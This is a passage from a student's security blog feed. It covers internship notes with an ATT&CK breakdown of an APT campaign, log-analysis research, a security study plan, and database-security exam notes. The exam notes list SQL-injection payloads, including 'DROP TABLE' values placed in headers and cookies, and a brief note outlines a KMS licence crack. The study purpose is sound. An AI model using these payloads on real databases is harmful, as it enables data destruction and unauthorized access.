align="left"></td><td align="left">T1070.004</td><td align="left">File Deletion (檔案刪除)</td><td align="left">在攻擊的不同階段，刪除安裝程式、腳本 (<code>bat.bat</code>)、壓縮檔及其他工具，以清理痕跡。</td></tr><tr><td align="left"></td><td align="left">T1564.003</td><td align="left">Hidden Window (隱藏視窗)</td><td align="left">利用合法的 <code>4t Tray Minimizer</code> 視窗管理工具將惡意活動的視窗最小化至系統托盤，以躲避使用者察覺。</td></tr><tr><td align="left"><strong>Credential Access (憑證存取)</strong></td><td align="left">T1003.002</td><td align="left">OS Credential Dumping: SAM</td><td align="left">轉儲 (Dump) HKLM\SAM 登錄檔鍵，以獲取本機使用者帳戶的憑證哈希。</td></tr><tr><td align="left"></td><td align="left">T1555</td><td align="left">Credentials from Password Stores (從密碼儲存區竊取憑證)</td><td align="left">1. 專門搜尋並竊取加密貨幣錢包的憑證和助記詞。&lt;br&gt;2. 利用 <code>WebBrowserPassView</code> 工具提取儲存在網頁瀏覽器中的密碼。</td></tr><tr><td align="left"><strong>Discovery (探索)</strong></td><td align="left">T1082</td><td align="left">System Information Discovery (系統資訊探索)</td><td align="left">1. 執行 <code>powercfg</code> 指令檢查電源設定，確保主機可被遠端連線。&lt;br&gt;2. 挖礦程式的 <code>worker</code> 進程會收集系統的 CPU、RAM 和 GPU 資訊，以優化挖礦配置。</td></tr><tr><td align="left"><strong>Collection (收集)</strong></td><td align="left">T1560.001</td><td align="left">Archive via Utility (透過工具壓縮)</td><td align="left">使用客製化版本的 <code>WinRAR (driver.exe)</code> 將竊取到的憑證、登錄檔鍵等敏感資料打包成受密碼保護的壓縮檔。</td></tr><tr><td align="left"></td><td align="left">T1113</td><td align="left">Screen Capture (螢幕擷取)</td><td align="left">利用 <code>Mipko Personal Monitor</code> 等合法監控軟體對受害者螢幕進行截圖。</td></tr><tr><td align="left"></td><td align="left">T1056.001</td><td align="left">Keylogging (鍵盤記錄)</td><td align="left">利用 <code>Mipko Personal Monitor</code> 等合法監控軟體記錄受害者的鍵盤輸入。</td></tr><tr><td align="left"><strong>Command and Control (命令與控制)</strong></td><td align="left">T1105</td><td align="left">Ingress Tool Transfer (傳入工具轉移)</td><td align="left">透過 <code>curl.exe</code> 工具從 C2 伺服器 (如 <code>downdown[.]ru</code>) 下載攻擊所需的各種合法軟體與惡意腳本。</td></tr><tr><td align="left"></td><td align="left">T1090</td><td align="left">Proxy (代理)</td><td align="left">利用 <code>ngrok</code> 建立反向代理通道，以便從外部網路連接到受感染的內部網路主機。</td></tr><tr><td align="left"><strong>Exfiltration (資料外洩)</strong></td><td align="left">T1048.003</td><td align="left">Exfiltration Over Unencrypted Non-C2 Protocol (透過未加密的非 C2 協定外洩)</td><td align="left">使用合法的 <code>Blat</code> SMTP 郵件工具，將打包好的壓縮檔透過電子郵件附件的方式傳送給攻擊者。</td></tr><tr><td align="left"><strong>Impact (影響)</strong></td><td align="left">T1496</td><td align="left">Resource Hijacking (資源劫持)</td><td align="left">在竊取完資料後，部署 <code>XMRig</code> 加密貨幣挖礦程式，利用受害者的電腦資源為攻擊者牟利。</td></tr></tbody></table></li><li><p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">ProcessMonitor</a> </p><ul><li>這個工具可以用來監控系統的檔案、註冊表、進程和網路活動</li><li>可以用來分析惡意軟體的行為或是偵測系統異常</li></ul></li></ul></li><li><p>Today’s Achievements:</p><ul><li><input checked="" disabled="" type="checkbox"> Report my progress in the meeting<ul><li>被告知實驗室主要用procmon做log錄製，不用自己寫(<em>但我還是把她寫得差不多了</em>)</li></ul></li><li><input checked="" disabled="" type="checkbox"> Read and analyze the APT case study<ul><li>了解APT攻擊者如何利用系統漏洞來竊取資料和挖掘加密貨幣</li></ul></li></ul></li><li><p>TODO:</p><ul><li>研究case study中提到的攻擊技術</li><li>在VM環境check icmp redirect有沒有在做事</li></ul></li></ul><h3 id="Day-9"><a href="#Day-9" class="headerlink" title="Day 9"></a>Day 9</h3><details><summary>偷懶星期五</summary><blockquote><p>發現自己研究所的進度來不及<br>加上老師下禮拜才回來目前也沒有特別的進度<br>所以今天專注在寫研究所的題目</p></blockquote></details><ul><li><p>Today’s Achievements:</p><ul><li>Determine Research Topic<ul><li>確立兩個月的題目: Log labeling for malware detection using deep learning</li><li>研究方向: 使用機器學習&#x2F;演算法方式在一段LOG中標記出惡意行為相關的logs</li></ul></li></ul></li><li><p>TODO:</p><ul><li>熟悉學長給的Dataset並想辦法生成可能會用的Dataset</li><li>與即將離開的intern交接</li><li>閱讀Logs Analysis相關paper</li></ul></li></ul><h3 id="Day-10"><a href="#Day-10" class="headerlink" title="Day 10"></a>Day 10</h3><details><summary>註釋人</summary><blockquote><p>嘗試把蜜茶放到實驗室的冷凍庫<br>然後再衝很濃的咖啡讓咖啡快速冰鎮與混合蜜茶<br>還不錯，但不如摩斯紅茶加咖啡</p></blockquote></details><ul><li><p>Notes of today</p><ul><li><code>tqdm</code><ul><li>一個用來顯示迴圈進度的Python套件</li><li>可以用來顯示迴圈的進度條、剩餘時間、已處理數量等資訊</li><li>E.g. 檔案處裡進度  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">url, filename</span>):</span><br><span class="line">    response = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line">    total_size = <span class="built_in">int</span>(response.headers.get(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file, tqdm(</span><br><span class="line">        desc=filename,</span><br><span class="line">        total=total_size,</span><br><span class="line">        unit=<span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">        unit_scale=<span class="literal">True</span>,</span><br><span class="line">        unit_divisor=<span class="number">1024</span>,</span><br><span class="line">    ) <span class="keyword">as</span> pbar:  </span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> response.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            size = file.write(data)</span><br><span class="line">            pbar.update(size) </span><br></pre></td></tr></table></figure></li></ul></li><li>程序樹追蹤<ul><li>BFS traversal<ul><li>透過根PID開始，將所有子程序的PID加入佇列</li><li>逐一處理佇列中的PID，並將其子程序的PID加入佇列</li></ul></li></ul></li><li>CALDERA abilities map to audit logs<ol><li><strong>定義需要的欄位</strong> - 指定從日誌中提取的關鍵欄位</li><li><strong>建立檔案映射</strong> - 將操作報告與對應的 procmon 日誌檔案進行配對</li><li><strong>提取成功執行的能力</strong> - 分析每個能力的執行結果和相關事件</li></ol></li></ul></li><li><p>Today’s Achievements:</p><ul><li><input checked="" disabled="" type="checkbox"> 將學長給的資料集依造ability種類做分類，並將其裡面的raw events分離出單獨的csv檔，再將原本的raw events value改成csv之檔名作對應</li><li><input checked="" disabled="" type="checkbox"> 閱讀log analysis相關的論文找尋處裡手邊資料的靈感</li><li><input checked="" disabled="" type="checkbox"> 將log 裡的資料標籤&#x2F;正規化<ol><li>將log裡的時間戳記轉換成datetime物件並利用MinMaxScaler做正規化</li><li>將除了detail的欄位轉換成數值型態，並將每個數值對應的欄位名稱存入一個json檔案中 </li><li>待改善: 將原本的csv 轉換成numpy array，並將其存入一個npy檔案中</li></ol></li></ul></li><li><p>TODO:</p><ul><li>generate characteristic features from the logs as second step of the preprocessing</li><li>研究如何將logs轉換成特徵向量</li></ul></li></ul><h3 id="Day-11-20"><a href="#Day-11-20" class="headerlink" title="Day 11~ 20"></a>Day 11~ 20</h3><details><summary>First meeting report</summary><blockquote><p><em>Day 12</em> 的時候被老師說要在下禮拜報告進度<br>所以死線人被assign死線後進度巨幅增長<br>接下來30多天應該也會以meeting report 做每次的更新<br>除非有特別想分享甚麼啦</p></blockquote></details><ul><li><p>Acievements:</p><ul><li><input checked="" disabled="" type="checkbox"> 將logs資料集依據路徑、命令與細節分別作預處裡<ul><li><input checked="" disabled="" type="checkbox"> 路徑: 將路徑建立成Tree以每個node的方式儲存 </li><li><input checked="" disabled="" type="checkbox"> 命令: 以<a href="https://jiemingzhu.github.io/pub/pjhe_icws2017.pdf">Drain</a>方法將command line做模板切割，分成constant與parameter以利做接下來的操作</li><li><input disabled="" type="checkbox"> 細節: partner說他想研究這塊所以我就先沒動</li></ul></li><li><input checked="" disabled="" type="checkbox"> 針對command line，建立每個command line template的特徵向量<ul><li>參考論文: <a href="https://arxiv.org/abs/1605.07766">Integrating Distributional Lexical Contrast into Word Embeddings for Antonym-Synonym Distinction</a></li><li>利用Genmini建立command line的同反義字彙組並結合word net 作為建立特徵向量的基礎</li><li>利用<a href="https://arxiv.org/abs/2410.08207">dLCE model</a> 建立特徵向量</li></ul></li><li><input checked="" disabled="" type="checkbox"> 利用非監督式學習方法將command line的特徵向量做聚類並找出anomaly command line</li><li><input checked="" disabled="" type="checkbox"> 透過PCA將特徵向量降維並可視化</li></ul></li><li><p>Following challenge</p><ol><li>Better parsing method to get better corpus</li><li>Add parameters and sections for more information hided in the dataset</li><li>Use more complex model and consider the importance of sequence relation (E.g. LSTM)</li><li>Label important paths to inform where possible malicious behaviors are</li><li>Use genetic algorithm to adjust parameters</li></ol></li></ul><h3 id="Day-23"><a href="#Day-23" class="headerlink" title="Day 23"></a>Day 23</h3><ul><li>Note of today<ul><li>Thursdays’ meeting<ul><li>Clearify input structure of every section</li><li>Explain background knowledge of each term but don’t spend too much time on it (better to use graphs to represent the concept)</li><li>Pick the specific term for the explanation</li><li>Tell the goal of every section</li></ul></li></ul></li></ul><h3 id="Day-34"><a href="#Day-34" class="headerlink" title="Day 34"></a>Day 34</h3><ul><li>Note of today<ul><li>Fridays’ meeting<ul><li>Durning the experiment AI, it should show the progress and results clearly and explainable.<ul><li>For example, using visualizations to represent the training progress</li><li>Try to figure out the reason why the loss will happen decreaseingly oscillation</li><li>If the loss not converges, try to adjust the learning rate or model architecture. OR simply run more epochs</li><li>Ground truth should be clearly defined and accessible for evaluation.</li></ul></li><li>KMS Crack<ul><li>Use a fake to fake as the real KMS</li><li>close port 1688 to prevent real KMS from being accessed or the corresponding detect from Microsoft</li><li>manipulate the fake KMS to act to be a real KM service</li></ul></li></ul></li></ul></li></ul><h3 id="Day-21-33"><a href="#Day-21-33" class="headerlink" title="Day 21~33"></a>Day 21~33</h3><p>(待更新)</p><hr><h2 id="上班之餘"><a href="#上班之餘" class="headerlink" title="上班之餘"></a>上班之餘</h2><h3 id="中研咖啡所"><a href="#中研咖啡所" class="headerlink" title="中研咖啡所"></a>中研咖啡所</h3><p>害我<a href="#day-2">DAY 2</a>遲到的咖啡店，手沖超好喝，憑證還可以九折<br>目前喝了:</p><ol><li>肯亞 AA 冰<br> 目測老闆是沖三段(不含悶蒸)，每段的水流的偏細，所以雖然是冰的但依然有濃厚的香氣與清楚的酸甜調，AA特有的烏梅也表現得很明顯</li></ol><h3 id="五吉郎"><a href="#五吉郎" class="headerlink" title="五吉郎"></a>五吉郎</h3><p>門口外面的早餐店，高級板比斯多，炒泡麵還不錯吃<br>可以先用網路點餐再取，非常適合快遲到的人<br><a href="#day-10">DAY 10</a>更， 蛋捲超好吃，大概就是一般的蔥油捲餅，但很好吃<br><a href="#day-11-20">Day 14</a>更，飲料紅茶奶茶都不推，很水很稀，但豆漿還行<br><a href="#day-11-20">Day 18</a>更，土司的抹醬有辣醬超爽，但裡面有洋蔥<br>[Day 25]更，蛋餅偏普通，可以吃其他品項就好<br>[Day 32]更，第一次嘗試漢堡，也是無雷，抹醬跟吐司一樣有多種可以選擇，加起司半融化讓整個漢堡大升級</p><h3 id="中研市場"><a href="#中研市場" class="headerlink" title="中研市場"></a>中研市場</h3><p>很多小餐廳，有點像百貨公司美食街<br>但中午會提供一個一百預作好的便當，每天菜色都不太一樣<br>口味大概就是有味道，應付研究人們的午餐需求，不貴但也稱不上好吃<br>唯一值得推薦的只有最裡面一家賣各式簡餐的燒肉飯，簡單的蒜煎燒肉帶點甜口的味覺體驗，搭配白飯就讓人一口接一口，其餘它配菜也是我認為在整個中研市場中比較有水準的</p><h3 id="聚豐德燒臘"><a href="#聚豐德燒臘" class="headerlink" title="聚豐德燒臘"></a>聚豐德燒臘</h3><p>一次不小心睡過頭遲到想說在市區買飯直接到實驗室吃午餐路過的便當店，只談論這種便當型的燒臘的話是我覺得吃過最有水準的。<br>基本功在三寶便當體現得淋漓盡致，最能體現與其他燒臘店差別的是叉燒肥而不膩，肉質已經像是松阪豬那種肥中帶脆的感覺，吃起來相當開心。甚至強推實驗室在某次meeting訂便當時訂這家，讓大家吃點好的。<br>而最讓我印象深刻的是這家鴨腿處理的非常合我胃口，不會有在外面便當店吃的鴨皮跟紙一樣難嚼，肉跟乾肉脯一樣柴軔，而是以適當的脆皮與鮮嫩多汁的肉質讓人在咬下第一口時眼前一亮。</p><h3 id="南軟雞肉飯"><a href="#南軟雞肉飯" class="headerlink" title="南軟雞肉飯"></a>南軟雞肉飯</h3><p>近年來很流行的雞肉飯形式，通常是將雞肉切片後放在飯上佐以當日的清疏、配菜與油蔥形成一種簡單的快餐。<br>特別將這間寫入是因為南港附近的食物實在太貴，而120~130元能吃到上述原型食物又能在不虧待自己的味蕾同時快速解決一餐讓我覺得這間雞肉飯店值得寫入。<br>通常會吃的品項是雙蛋雞肉飯(130)，除了上述的菜色外還有兩顆半熟蛋，除了因為蛋是先煮好的所有有時候會有些冷掉外，整體來說還是相當不錯的。</p><hr><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;中研院資訊所暑期實習&quot;&gt;&lt;a href=&quot;#中研院資訊所暑期實習&quot; class=&quot;headerlink&quot; title=&quot;中研院資訊所暑期實習&quot;&gt;&lt;/a&gt;中研院資訊所暑期實習&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="資工" scheme="http://withoutdirection.github.io/categories/%E8%B3%87%E5%B7%A5/"/>
    
    
    <category term="電腦安全" scheme="http://withoutdirection.github.io/tags/%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8/"/>
    
    <category term="實習" scheme="http://withoutdirection.github.io/tags/%E5%AF%A6%E7%BF%92/"/>
    
  </entry>
  
  <entry>
    <title>自學電安的52周</title>
    <link href="http://withoutdirection.github.io/Computer-security-self-study/"/>
    <id>http://withoutdirection.github.io/Computer-security-self-study/</id>
    <published>2025-06-05T11:01:23.631Z</published>
    <updated>2025-06-06T08:13:44.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Computer-Security-Mastery-Plan"><a href="#Computer-Security-Mastery-Plan" class="headerlink" title="Computer Security Mastery Plan"></a>Computer Security Mastery Plan</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想在電腦安全的領域做更深入一點的研究，於是用GPT生成了一個自學計畫表(從最基礎的開始)，以此文章記錄每個階段的心得與結果</p><hr><h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul><li><strong>48 weeks total</strong></li><li><strong>4 Phases</strong></li><li>Weekly goals, study topics, hands-on labs, tools, and checklist</li><li>Focus on implementation, CTF, malware, pentesting, exploit dev, and defensive engineering</li></ul><hr><h2 id="Phase-1-Foundation"><a href="#Phase-1-Foundation" class="headerlink" title="Phase 1: Foundation"></a>Phase 1: Foundation</h2><p><strong>Goals:</strong> Build strong OS, networking, crypto, and web security fundamentals.</p><h3 id="Topics-Labs"><a href="#Topics-Labs" class="headerlink" title="Topics &amp; Labs:"></a>Topics &amp; Labs:</h3><ul><li>OS&#x2F;Linux fundamentals &amp; scripting</li><li>TCP&#x2F;IP, DNS, DHCP, NAT, VLANs</li><li>Cryptography (XOR, AES, RSA)</li><li>Web Security (OWASP Top 10)</li><li>Packet sniffing &amp; network scanning</li><li>Firewalls, VPN, IDS&#x2F;IPS basics</li></ul><p><strong>Tools:</strong><br><code>tcpdump</code>, <code>Wireshark</code>, <code>nmap</code>, <code>openssl</code>, <code>iptables</code>, <code>Suricata</code>, <code>OpenVPN</code>, <code>DVWA</code></p><p><strong>Hands-on:</strong></p><ul><li>Build your own virtual network topology (3 VMs: attacker, victim, firewall)</li><li>Write custom packet sniffer (Python&#x2F;Scapy)</li><li>Run 5 OWASP lab exploits</li></ul><hr><h2 id="Phase-2-Practical-Attacker-Techniques"><a href="#Phase-2-Practical-Attacker-Techniques" class="headerlink" title="Phase 2: Practical Attacker Techniques"></a>Phase 2: Practical Attacker Techniques</h2><p><strong>Goals:</strong> Learn offense: enumeration, exploitation, reverse engineering.</p><h3 id="Topics-Labs-1"><a href="#Topics-Labs-1" class="headerlink" title="Topics &amp; Labs:"></a>Topics &amp; Labs:</h3><ul><li>Vulnerability scanning (<code>OpenVAS</code>, <code>Nessus</code>)</li><li>Manual web app attacks (SQLi, XSS, CSRF)</li><li>Buffer overflow + GDB debugging</li><li>Format string, heap overflow basics</li><li>Malware static &amp; dynamic analysis</li><li>SSH brute-force, ARP spoofing</li></ul><p><strong>Tools:</strong><br><code>Metasploit</code>, <code>Ghidra</code>, <code>BurpSuite</code>, <code>Hydra</code>, <code>Bettercap</code>, <code>GDB</code>, <code>Scapy</code></p><p><strong>Hands-on:</strong></p><ul><li>Write a buffer overflow exploit (C)</li><li>Disassemble a C program with Ghidra</li><li>Build an SSH brute-force script (Python)</li><li>Perform a live ARP poisoning + packet capture</li><li>Create and evade a simple backdoor</li></ul><hr><h2 id="Phase-3-Advanced-Exploit-Development-Malware-Engineering"><a href="#Phase-3-Advanced-Exploit-Development-Malware-Engineering" class="headerlink" title="Phase 3: Advanced Exploit Development &amp; Malware Engineering"></a>Phase 3: Advanced Exploit Development &amp; Malware Engineering</h2><p><strong>Goals:</strong> Master memory corruption, shellcode, binary exploitation, malware obfuscation.</p><h3 id="Topics-Labs-2"><a href="#Topics-Labs-2" class="headerlink" title="Topics &amp; Labs:"></a>Topics &amp; Labs:</h3><ul><li>ASLR, DEP, PIE, canary bypass</li><li>ROP chain construction</li><li>Shellcoding (x86&#x2F;x64)</li><li>Advanced malware: packing, encryption</li><li>Reverse engineering C++, obfuscated binaries</li><li>Ransomware and virus simulations</li></ul><p><strong>Tools:</strong><br><code>pwntools</code>, <code>Radare2</code>, <code>Immunity Debugger</code>, <code>Ghidra</code>, <code>IDA Free</code>, <code>YARA</code>, <code>Scapy</code></p><p><strong>Hands-on:</strong></p><ul><li>Build custom ROP exploit (ret2libc)</li><li>Write an AES-encrypted ransomware simulator</li><li>Create a custom TCP reverse shell</li><li>Perform static and dynamic analysis of a packed malware sample</li></ul><hr><h2 id="Phase-4-Defense-Engineering-Incident-Response-CTF-Mastery"><a href="#Phase-4-Defense-Engineering-Incident-Response-CTF-Mastery" class="headerlink" title="Phase 4: Defense Engineering, Incident Response &amp; CTF Mastery"></a>Phase 4: Defense Engineering, Incident Response &amp; CTF Mastery</h2><p><strong>Goals:</strong> Learn to detect, mitigate, and respond to advanced attacks.</p><h3 id="Topics-Labs-3"><a href="#Topics-Labs-3" class="headerlink" title="Topics &amp; Labs:"></a>Topics &amp; Labs:</h3><ul><li>SIEM: Security Onion, ELK Stack</li><li>Threat Hunting methodology</li><li>Digital forensics: memory, disk, network captures</li><li>Honeypot deployment (Cowrie, Dionaea)</li><li>Incident response playbooks</li><li>Host hardening &amp; secure system design</li><li>CTF reversing, pwn, crypto, forensics tracks</li></ul><p><strong>Tools:</strong><br><code>Security Onion</code>, <code>ELK</code>, <code>Volatility</code>, <code>FTK Imager</code>, <code>Cowrie</code>, <code>Splunk</code>, <code>Snort</code></p><p><strong>Hands-on:</strong></p><ul><li>Deploy honeypot on a VPS and collect logs</li><li>Write detection YARA rules for known malware</li><li>Solve 20 CTF challenges from picoCTF, HTB, or pwnable.tw</li><li>Investigate a simulated ransomware incident  </li><li>Build a personal CTF toolkit repository</li></ul><hr><h2 id="Final-Capstone"><a href="#Final-Capstone" class="headerlink" title="Final Capstone"></a>Final Capstone</h2><p><strong>Project:</strong><br>Design, attack, defend your own small-scale enterprise network:</p><ul><li>Public DMZ web server  </li><li>Internal AD server  </li><li>VPN access point  </li><li>IDS&#x2F;IPS perimeter  </li><li>Central logging server  </li><li>Threat detection&#x2F;response plan</li></ul><p>Document everything:</p><ul><li>Threat model</li><li>Network map</li><li>Attacks performed</li><li>Defenses deployed</li><li>Forensics on captured logs</li></ul><hr><h2 id="Progress-Tracker"><a href="#Progress-Tracker" class="headerlink" title="Progress Tracker"></a>Progress Tracker</h2><table><thead><tr><th align="left">Phase</th><th align="left">Description</th><th align="left">Status</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">Foundation (OS, Networking, Crypto)</td><td align="left">☐</td></tr><tr><td align="left">2</td><td align="left">Attacker Techniques &amp; Exploit Basics</td><td align="left">☐</td></tr><tr><td align="left">3</td><td align="left">Advanced Exploit &amp; Malware Engineering</td><td align="left">☐</td></tr><tr><td align="left">4</td><td align="left">Defense, Incident Response, CTF</td><td align="left">☐</td></tr><tr><td align="left">Capstone</td><td align="left">Complete Attack &amp; Defense Simulation</td><td align="left">☐</td></tr></tbody></table><hr><h2 id="Recommended-Reading"><a href="#Recommended-Reading" class="headerlink" title="Recommended Reading"></a>Recommended Reading</h2><ul><li><em>The Web Application Hacker’s Handbook</em></li><li><em>Practical Malware Analysis</em></li><li><em>Hacking: The Art of Exploitation</em></li><li><em>Black Hat Python</em></li><li><em>CTF Field Guide</em></li><li><em>Modern Binary Exploitation</em></li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Computer-Security-Mastery-Plan&quot;&gt;&lt;a href=&quot;#Computer-Security-Mastery-Plan&quot; class=&quot;headerlink&quot; title=&quot;Computer Security Mastery Plan&quot;&gt;</summary>
      
    
    
    
    
    <category term="資工" scheme="http://withoutdirection.github.io/tags/%E8%B3%87%E5%B7%A5/"/>
    
    <category term="Computer Security" scheme="http://withoutdirection.github.io/tags/Computer-Security/"/>
    
    <category term="自學計畫" scheme="http://withoutdirection.github.io/tags/%E8%87%AA%E5%AD%B8%E8%A8%88%E7%95%AB/"/>
    
  </entry>
  
  <entry>
    <title>電腦安全總整與實作期末筆記</title>
    <link href="http://withoutdirection.github.io/CSC-final/"/>
    <id>http://withoutdirection.github.io/CSC-final/</id>
    <published>2025-05-29T16:00:00.000Z</published>
    <updated>2025-06-01T20:56:13.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="電腦安全總整與實作期末筆記"><a href="#電腦安全總整與實作期末筆記" class="headerlink" title="電腦安全總整與實作期末筆記"></a>電腦安全總整與實作期末筆記</h1><h2 id="Chapter-5-Database-Cloud-security"><a href="#Chapter-5-Database-Cloud-security" class="headerlink" title="Chapter 5: Database&amp;Cloud security"></a>Chapter 5: Database&amp;Cloud security</h2><h3 id="Needs-for-Database-Security"><a href="#Needs-for-Database-Security" class="headerlink" title="Needs for Database Security"></a>Needs for Database Security</h3><p>Database security often lags behind the increasing reliance on databases due to:</p><ol><li>Complexity of DBMS: Database Management Systems are complex, featuring many new services and sophisticated interaction protocols like SQL, which is more complex than HTTP.</li><li>Mismatch in Capabilities: Administrators may have limited security knowledge or an incomplete understanding of DBMS.</li><li>Heterogeneous Platforms: Databases operate across diverse platforms (e.g., Oracle, IBM, Microsoft; Oracle E-Business Suite, Siebel; UNIX, Linux, Windows).</li><li>OS Security Limitations: Traditional OS-based security that controls read&#x2F;write access to entire files is insufficient for database security requirements</li></ol><h3 id="SQLi-SQL-Injection"><a href="#SQLi-SQL-Injection" class="headerlink" title="SQLi (SQL Injection)"></a>SQLi (<em>SQL Injection</em>)</h3><h4 id="Mechanism"><a href="#Mechanism" class="headerlink" title="Mechanism"></a>Mechanism</h4><ul><li><p>SQLi exploits web application pages by sending malicious SQL commands to the database server.</p></li><li><p>Typically involves prematurely terminating a text string and appending a new command </br> <strong>(E.g. Using the comment mark – to ignore subsequent legitimate text.)</strong></p></li><li><p>Attack Avenues:</p><ol><li>User input: Injects SQL commands by providing suitably crafted user input</li><li>Physical user input: </br> E.g. conventional barcodes and RFID tags</li><li>Server variables </br> E.g. HTTP headers and network protocol headers</li><li>Second-order injection (<em>relying on existing data in the system</em>)</li><li>Cookies</li></ol><ul><li>Summary Table</li></ul><table><thead><tr><th>Attack Avenue</th><th>Example Payload</th><th>How It Works</th></tr></thead><tbody><tr><td>User Input</td><td>‘ OR ‘1’&#x3D;’1</td><td>Injects directly via form fields.</td></tr><tr><td>Physical User Input</td><td>RFID: ‘ OR ‘1’&#x3D;’1</td><td>Malicious data encoded into device inputs.</td></tr><tr><td>Server Variables</td><td>User-Agent: ‘); DROP TABLE logs; –</td><td>Injects via HTTP headers or protocol metadata.</td></tr><tr><td>Second-Order Injection</td><td>Register ‘ OR ‘1’&#x3D;’1</td><td>Malicious data stored and triggered on a later query.</td></tr><tr><td>Cookies</td><td>user_id&#x3D;105; DROP TABLE users; –</td><td>Injects via manipulated cookies read into SQL queries.</td></tr></tbody></table></li></ul><h4 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h4><ol><li><p>In-band Attacks: Use the same communication channel for injection and results retrieval. </p><ol><li>Tautology: Injects code into conditional statements to always evaluate to true.</li><li>End-of-line Comment: Nullifies legitimate code by injecting comments.</li><li>Piggybacked Queries: Adds additional queries beyond the intended one.</li></ol></li><li><p>Out-of-band Attacks: Use a different channel (e.g., email) for data retrieval <br> <strong>Often when information retrieval is limited but outbound connectivity is lax.</strong></p></li><li><p>Inferential Attacks: Reconstruct information by observing website&#x2F;database server behavior to particular requests, without actual data transfer. </p><ol><li>Illegal&#x2F;Logically Incorrect Queries: <br>Exploits <strong>overly descriptive error pages</strong> to gather backend database information.</li><li>Blind SQL Injection: <br>Infers data by asking true&#x2F;false questions, even when no erroneous information is displayed.</li></ol></li></ol><h4 id="Countermeasures"><a href="#Countermeasures" class="headerlink" title="Countermeasures"></a>Countermeasures</h4><ul><li>Defensive Coding:<ul><li>Defensive Coding:</li><li>Manual defensive coding practices.</li><li>Parameterized query insertion.</li><li>SQL Document Object Model (DOM).</li></ul></li><li>Detection:<ul><li>Signature-based (identifying attack patterns).</li><li>Anomaly-based (detecting deviations from normal behavior).</li><li>Code analysis.</li><li>Pre-attacking the system.</li></ul></li><li>Run-time Prevention: Checking queries at runtime against a model of expected queries  </li><li>Inference Detection Approaches:<ol><li>During Database Design: <br>Altering database structure (e.g., splitting tables, finer-grained access control) to remove inference channels. <br><em>However, this can lead to unnecessarily stricter access controls (availability reduction).</em></li><li>At Query Time: Eliminating inference channel violations during queries. This remains a difficult and ongoing research problem.</li></ol></li></ul><h3 id="Database-Access-Control"><a href="#Database-Access-Control" class="headerlink" title="Database Access Control"></a>Database Access Control</h3><ul><li>DBMS Support: Commercial and open-source DBMSs typically support <strong>Discretionary Access Control (DAC)</strong> or <strong>Role-Based Access Control (RBAC)</strong></li></ul><h4 id="Administrative-Policies"><a href="#Administrative-Policies" class="headerlink" title="Administrative Policies:"></a>Administrative Policies:</h4><ol><li>Centralized Administration: A small number of privileged users manage access rights.</li><li>Ownership-based Administration: A table’s creator grants and revokes rights to their table.</li><li>Decentralized Administration: Table owners can delegate authorization rights to other users.</li></ol><h4 id="Cascading-Authorizations"><a href="#Cascading-Authorizations" class="headerlink" title="Cascading Authorizations"></a>Cascading Authorizations</h4><ul><li>Grant&#x2F;Revoke options can enable&#x2F;disable access rights to cascade through users.</li><li>Revoking an original grant also revokes any cascaded rights, unless they would exist independently.</li></ul><h4 id="RBAC-Role-Based-Access-Control"><a href="#RBAC-Role-Based-Access-Control" class="headerlink" title="RBAC(Role-Based Access Control)"></a>RBAC(<em><strong>Role-Based Access Control</strong></em>)</h4><ul><li><strong>RBAC eases administrative burden and improves security</strong> by ebabling:</li></ul><ol><li>Creation and deletion of roles.</li><li>Definition of permissions for a role.</li><li>Assignment and cancellation of users to roles.</li><li>Categories of Database Users: Application owner, end user, and administrator.</li></ol><h3 id="Database-Encryption"><a href="#Database-Encryption" class="headerlink" title="Database Encryption"></a>Database Encryption</h3><p>Database encryption serves as the last line of defense in database security, protecting the most valuable information resource for organizations.</p><ul><li><p>Application Levels: Encryption can be applied to the entire database, or at the record (rows), attribute (columns), or individual field levels.</p></li><li><p>Disadvantages:</p><ol><li>Inflexibility: Can make record searching difficult.</li><li>Key Management: Authorized users require access to decryption keys for the data they are permitted to access.</li></ol></li><li><p>Database Encryption Scheme Elements:</p><ul><li>Data Owner: Organization producing data for controlled release.</li><li>User: Human entity submitting queries.</li><li>Client: Frontend transforming user queries into queries on encrypted server data.</li><li>Server: Organization receiving and distributing encrypted data to clients.</li></ul></li><li><p>Flexible Approach: <br>Since encryption can block range queries or pattern matching, a flexible approach is needed:</p><ul><li>Idea: Divide the domain of attribute values into non-overlapping partitions.</li><li>Example:</li><li>Suppose you encrypt employee IDs. You might partition them like this: <br></li></ul><pre><code class="language-yanl">Range 1: 1000–1999  Range 2: 2000–2999  ...</code></pre><p>  Queries like SELECT * FROM employees WHERE id BETWEEN 1500 AND 2500 can be transformed into:</p><pre><code>  